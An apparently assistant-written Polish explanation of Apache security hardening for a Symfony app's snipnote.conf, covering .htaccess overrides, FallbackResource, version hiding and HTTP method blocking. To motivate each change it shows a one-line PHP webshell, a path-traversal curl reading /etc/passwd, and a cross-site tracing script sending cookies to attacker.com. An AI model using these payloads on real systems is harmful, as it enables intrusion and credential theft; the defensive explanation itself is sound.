## Szczegółowe wyjaśnienie zmian w `snipnote.conf`

Przejdę przez każdą zmianę i wyjaśnię **jak działa**, **dlaczego jest bezpieczna** i **jak wpływa na Symfony**.

---

## Zmiana 1: ServerName

### BYŁO:
```apache
ServerName snipnote.local
```

### JEST:
```apache
ServerName snipnote.pl
```

**Co to robi:**
- Definiuje domenę dla tego VirtualHost
- Apache używa tego do **name-based virtual hosting** (gdy masz wiele domen na jednym IP)

**Dlaczego zmiana:**
- `snipnote.local` = dev/testing
- `snipnote.pl` = produkcja
- Powinno pasować do `TRAEFIK_DOMAIN` z `.env`

**Wpływ:**
- ✅ Apache poprawnie rozpoznaje domenę produkcyjną
- ✅ Logi pokazują właściwą nazwę serwera

---

## Zmiana 2: `AllowOverride All` → `AllowOverride None`

### BYŁO:
```apache
<Directory /var/www/html/public>
    AllowOverride All
    Require all granted
</Directory>
```

### JEST:
```apache
<Directory /var/www/html/public>
    AllowOverride None
    Require all granted
    
    FallbackResource /index.php
</Directory>
```

### Co robi `AllowOverride`:

**`AllowOverride All`** (NIEBEZPIECZNE):
```
Apache: "Sprawdzę każdy katalog w path czy ma .htaccess"
Request: GET /some/deep/path/file.php

Apache checks:
  /.htaccess                      ← sprawdza (read from disk)
  /var/.htaccess                  ← sprawdza (read from disk)
  /var/www/.htaccess              ← sprawdza (read from disk)
  /var/www/html/.htaccess         ← sprawdza (read from disk)
  /var/www/html/public/.htaccess  ← sprawdza (read from disk)

Każdy .htaccess może OVERRIDE dowolne dyrektywy!
```

**`AllowOverride None`** (BEZPIECZNE):
```
Apache: "Ignoruję wszystkie .htaccess"
Request: GET /some/deep/path/file.php

Apache:
  - Używa TYLKO konfiguracji z snipnote.conf
  - NIE sprawdza żadnych .htaccess
  - Szybsze (brak I/O disk reads)
  - Bezpieczniejsze (attacker nie może wrzucić .htaccess)
```

---

### Dlaczego `AllowOverride All` jest niebezpieczne:

#### Atak: Webshell przez .htaccess

**Scenariusz:**
1. Attacker znajduje upload vulnerability
2. Wrzuca plik `.htaccess` do `/var/www/html/public/uploads/`:
```apache
# .htaccess uploaded by attacker
AddHandler application/x-httpd-php .jpg

# Teraz obrazki są traktowane jako PHP!
```

3. Wrzuca `shell.jpg`:
```php
<?php
system($_GET['cmd']);
// EXIF data: fake image headers
?>
```

4. Otwiera: `https://snipnote.pl/uploads/shell.jpg?cmd=cat /etc/passwd`
5. **Apache wykonuje shell.jpg jako PHP** ❌

**Z `AllowOverride None`:**
- `.htaccess` jest **ignorowany**
- `shell.jpg` jest serwowany jako obraz (nie jako PHP)
- **Atak zablokowany** ✅

---

#### Atak: Bypass security przez .htaccess

```apache
# Attacker wrzuca .htaccess:
Satisfy Any
Order allow,deny
Allow from all

# Teraz można dostać się do .git/, .env, etc
```

**Z `AllowOverride None`:**
- `.htaccess` jest ignorowany
- Security rules z VirtualHost są egzekwowane
- **Atak zablokowany** ✅

---

### Dlaczego Symfony NIE potrzebuje `.htaccess`:

**Symfony używa Front Controller Pattern:**

```
                    ┌─────────────────────┐
Request: /notes/123 │                     │
        │            │   Apache + Symfony  │
        ▼            │                     │
    ┌────────────┐   │  ┌──────────────┐  │
    │ Apache     │───┼─▶│ index.php    │  │
    │            │   │  │ (front ctrl) │  │
    └────────────┘   │  └──────────────┘  │
                     │         │           │
                     │         ▼           │
                     │  ┌──────────────┐  │
                     │  │ Symfony      │  │
                     │  │ Router       │  │
                     │  └──────────────┘  │
                     │         │           │
                     │         ▼           │
                     │  ┌──────────────┐  │
                     │  │ Controller   │  │
                     │  │ NotesController│ │
                     │  └──────────────┘  │
                     └─────────────────────┘
```

**Wszystkie requesty idą przez `index.php`:**
- `GET /` → `index.php`
- `GET /notes` → `index.php`
- `GET /notes/123` → `index.php`
- `GET /api/login` → `index.php`

Symfony router wewnętrznie decyduje gdzie skierować request.

---

### `FallbackResource /index.php` - jak to działa:

```apache
FallbackResource /index.php
```

**Co to robi:**
```
Apache logic:
  1. Request przychodzi: GET /notes/123
  2. Apache sprawdza: czy plik /var/www/html/public/notes/123 istnieje?
     ❌ NIE
  3. Apache sprawdza: czy katalog /var/www/html/public/notes/ istnieje?
     ❌ NIE
  4. FallbackResource: przekieruj wewnętrznie do /index.php
  5. index.php dostaje:
     - REQUEST_URI = /notes/123
     - SCRIPT_NAME = /index.php
  6. Symfony router parseuje /notes/123 i znajduje route
```

**Przykład:**

Request: `GET /notes/123`

```
Apache:
  - Nie ma fizycznego pliku /notes/123
  - FallbackResource → internal redirect to /index.php
  
Symfony otrzymuje:
  $_SERVER['REQUEST_URI'] = '/notes/123'
  $_SERVER['SCRIPT_NAME'] = '/index.php'
  
Symfony Router:
  Route: /notes/{id}
  Controller: NotesController::show
  Parameters: ['id' => 123]
```

**Dla plików statycznych:**

Request: `GET /assets/app.css`

```
Apache:
  - Sprawdza: /var/www/html/public/assets/app.css
  - ✅ Plik istnieje!
  - Apache serwuje bezpośrednio (NIE przez index.php)
  - Szybsze - Symfony nie jest angażowane
```

---

### Porównanie: `.htaccess` vs `FallbackResource`

**Z `.htaccess` (stara metoda):**
```apache
# .htaccess w /public
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php [QSA,L]
```

**Z `FallbackResource` (nowa metoda):**
```apache
# W VirtualHost
FallbackResource /index.php
```

| Aspekt | `.htaccess` | `FallbackResource` |
|--------|-------------|-------------------|
| Bezpieczeństwo | ⚠️ Może być override | ✅ Nie może być override |
| Wydajność | ⚠️ Wolniejsze (regex) | ✅ Szybsze (native Apache) |
| Czytelność | ⚠️ Skomplikowane | ✅ Proste |
| Możliwość ataku | ⚠️ TAK | ✅ NIE |

---

## Zmiana 3: Security Headers

### DODANO:
```apache
# Security: Hide Apache version and OS
ServerTokens Prod
ServerSignature Off
```

### Co to robi:

**BEZ tych opcji:**
```bash
$ curl -I http://example.com/nonexistent

HTTP/1.1 404 Not Found
Server: Apache/2.4.65 (Debian) PHP/8.4.1  ← 🔴 Pokazuje wersję!

<html>
<head><title>404 Not Found</title></head>
<body>
<h1>Not Found</h1>
<hr>
<address>Apache/2.4.65 (Debian) Server at example.com Port 80</address>  ← 🔴 Podpis!
</body>
</html>
```

**Z tymi opcjami:**
```bash
$ curl -I http://example.com/nonexistent

HTTP/1.1 404 Not Found
Server: Apache  ← ✅ Tylko nazwa, bez wersji

<html>
<head><title>404 Not Found</title></head>
<body>
<h1>Not Found</h1>
</body>
</html>  ← ✅ Brak podpisu serwera
```

### Dlaczego to ważne - Security through obscurity:

**Attacker workflow:**
```
1. Recon: curl -I snipnote.pl
   Response: Server: Apache/2.4.41 (Ubuntu)
   
2. Search: "Apache 2.4.41 exploits"
   Finds: CVE-2021-41773 (Path Traversal)
   
3. Exploit: curl "https://snipnote.pl/icons/..%2e/..%2e/..%2e/..%2e/etc/passwd"
   ❌ Pwned!
```

**Z ukrytą wersją:**
```
1. Recon: curl -I snipnote.pl
   Response: Server: Apache
   
2. Search: "Apache exploits"
   Finds: 1000+ CVEs dla wszystkich wersji
   Attacker: "Która wersja? Nie wiem..."
   
3. Musi próbować wszystkich exploitów (time-consuming)
   Rate limiting + Fail2ban: Blokują po 5 próbach
   ✅ Atak utrudniony!
```

---

## Zmiana 4: Disable dangerous HTTP methods

### DODANO:
```apache
# Security: Disable dangerous HTTP methods
<LimitExcept GET POST PUT DELETE PATCH OPTIONS HEAD>
    Require all denied
</LimitExcept>
```

### Co to robi:

**Dozwolone metody:**
- `GET` - pobranie zasobu
- `POST` - utworzenie zasobu
- `PUT` - update zasobu
- `DELETE` - usunięcie zasobu
- `PATCH` - częściowy update
- `OPTIONS` - CORS preflight
- `HEAD` - tylko headers (bez body)

**Zablokowane metody:**
- `TRACE` - echo back request
- `TRACK` - to samo co TRACE
- `CONNECT` - proxy tunnel
- `PROPFIND` - WebDAV
- `PROPPATCH` - WebDAV
- `MKCOL` - WebDAV
- `COPY` - WebDAV
- `MOVE` - WebDAV
- `LOCK` - WebDAV
- `UNLOCK` - WebDAV

---

### Dlaczego `TRACE` jest niebezpieczne:

#### Atak: XSS + TRACE = Cross-Site Tracing (XST)

**Scenariusz:**
```javascript
// Attacker wrzuca XSS:
<script>
fetch('https://snipnote.pl/', {
  method: 'TRACE',
  credentials: 'include',  // Include cookies
  headers: {
    'Cookie': document.cookie
  }
})
.then(r => r.text())
.then(body => {
  // TRACE echoes back the request including cookies!
  fetch('https://attacker.com/steal?cookies=' + body);
});
</script>
```

**Co robi TRACE:**
```
Request:
TRACE / HTTP/1.1
Host: snipnote.pl
Cookie: session=abc123; jwt=xyz789
Authorization: Bearer secret_token

Response (ECHO):
HTTP/1.1 200 OK
Content-Type: message/http

TRACE / HTTP/1.1
Host: snipnote.pl
Cookie: session=abc123; jwt=xyz789  ← 🔴 Cookies leaked!
Authorization: Bearer secret_token  ← 🔴 Token leaked!
```

**Z `<LimitExcept>`:**
```
Request:
TRACE / HTTP/1.1

Response:
HTTP/1.1 403 Forbidden  ← ✅ Zablokowane!
```

---

### Dlaczego WebDAV methods są niebezpieczne:

**Jeśli WebDAV jest włączony:**
```
PROPFIND /var/www/html/ HTTP/1.1
Host: snipnote.pl

Response:
<?xml version="1.0"?>
<D:multistatus>
  <D:response>
    <D:href>/var/www/html/.env</D:href>  ← 🔴 Leaks file structure!
    <D:href>/var/www/html/config/</D:href>
  </D:response>
</D:multistatus>
```

Attacker może:
- Listować pliki (`PROPFIND`)
- Uploadować pliki (`PUT`)
- Kopiować pliki (`COPY`)
- Lockować pliki (`LOCK`)

**Z `<LimitExcept>`:**
```
PROPFIND /var/www/html/ HTTP/1.1

Response:
HTTP/1.1 403 Forbidden  ← ✅ Zablokowane!
```

---

## Jak to wszystko współpracuje z Symfony:

### Przepływ requestu z nowymi security settings:

```
1. Browser: GET /notes/123
   ↓
2. Traefik (443) 
   - Terminates SSL
   - Adds X-Forwarded-Proto: https
   - Forwards to app container:80
   ↓
3. Apache VirtualHost (snipnote.conf)
   ├─ ServerName: snipnote.pl ✅
   ├─ ServerTokens Prod: Hide version ✅
   ├─ LimitExcept: Check if GET allowed ✅
   ├─ AllowOverride None: Ignore .htaccess ✅
   └─ FallbackResource: /index.php
   ↓
4. index.php (Symfony Front Controller)
   ├─ Bootstraps Symfony Kernel
   ├─ Handles Request
   └─ Returns Response
   ↓
5. Apache sends response
   ├─ Server: Apache (nie Apache/2.4.65)
   └─ No ServerSignature
   ↓
6. Traefik adds security headers
   ├─ Strict-Transport-Security
   ├─ X-Frame-Options
   └─ X-Content-Type-Options
   ↓
7. Browser receives response ✅
```

---

## Testowanie zmian:

### Test 1: Sprawdź czy routing działa

```bash
# Test front controller
curl -I http://localhost/
# Oczekiwane: 200 OK

curl -I http://localhost/notes
# Oczekiwane: 200 OK (lub 302 redirect do login)

curl -I http://localhost/nonexistent-route
# Oczekiwane: 404 (przez Symfony, nie Apache)
```

### Test 2: Sprawdź czy .htaccess jest ignorowany

```bash
# Wrzuć .htaccess do public/
echo "Deny from all" > /var/www/html/public/.htaccess

# Test
curl -I http://localhost/
# Oczekiwane: 200 OK (htaccess ignorowany)

# Cleanup
rm /var/www/html/public/.htaccess
```

### Test 3: Sprawdź ServerTokens

```bash
curl -I http://localhost/ | grep Server
# Oczekiwane: Server: Apache (bez wersji)
```

### Test 4: Sprawdź blokowanie TRACE

```bash
curl -X TRACE http://localhost/
# Oczekiwane: 403 Forbidden
```

### Test 5: Sprawdź dozwolone metody

```bash
curl -X GET http://localhost/
# Oczekiwane: 200 OK

curl -X POST http://localhost/api/login
# Oczekiwane: 200/401 (zależy od auth)

curl -X OPTIONS http://localhost/
# Oczekiwane: 200 OK (CORS preflight)
```

---

## Podsumowanie zmian bezpieczeństwa:

| Zmiana | Blokuje atak | Wpływ na Symfony | Może złamać? |
|--------|--------------|------------------|--------------|
| `AllowOverride None` | Webshell przez .htaccess | ✅ Działa (używa FallbackResource) | ❌ NIE |
| `FallbackResource` | N/A (replacement dla .htaccess) | ✅ Routing działa | ❌ NIE |
| `ServerTokens Prod` | Version enumeration | ✅ Brak wpływu | ❌ NIE |
| `ServerSignature Off` | Information leakage | ✅ Brak wpływu | ❌ NIE |
| `LimitExcept` | XST, WebDAV exploits | ✅ API działa (GET/POST/PUT/DELETE OK) | ❌ NIE* |

*Jeśli używasz egzotycznych HTTP methods (np. `LOCK`, `PROPFIND`), może nie działać.

---

## Możliwe problemy:

### Problem 1: CORS preflight fails

**Objaw:**
```
Browser console: CORS preflight (OPTIONS) failed
```

**Przyczyna:**
- Symfony nie obsługuje OPTIONS poprawnie
- lub `<LimitExcept>` blokuje OPTIONS w specyficznym kontekście

**Rozwiązanie:**
```apache
# Dodaj explicit OPTIONS handling przed <LimitExcept>
<If "%{REQUEST_METHOD} == 'OPTIONS'">
    Header set Access-Control-Allow-Origin "*"
    Header set Access-Control-Allow-Methods "GET, POST, PUT, DELETE, PATCH, OPTIONS"
    Header set Access-Control-Max-Age "3600"
</If>
```

### Problem 2: Aplikacja używa custom HTTP method

**Objaw:**
```
Client: PROPFIND /api/resource
Server: 403 Forbidden
```

**Rozwiązanie:**
```apache
# Dodaj custom method do <LimitExcept>
<LimitExcept GET POST PUT DELETE PATCH OPTIONS HEAD PROPFIND>
    Require all denied
</LimitExcept>
```

---

**Wszystkie te zmiany są bezpieczne dla standardowej aplikacji Symfony i NIE powinny niczego złamać.**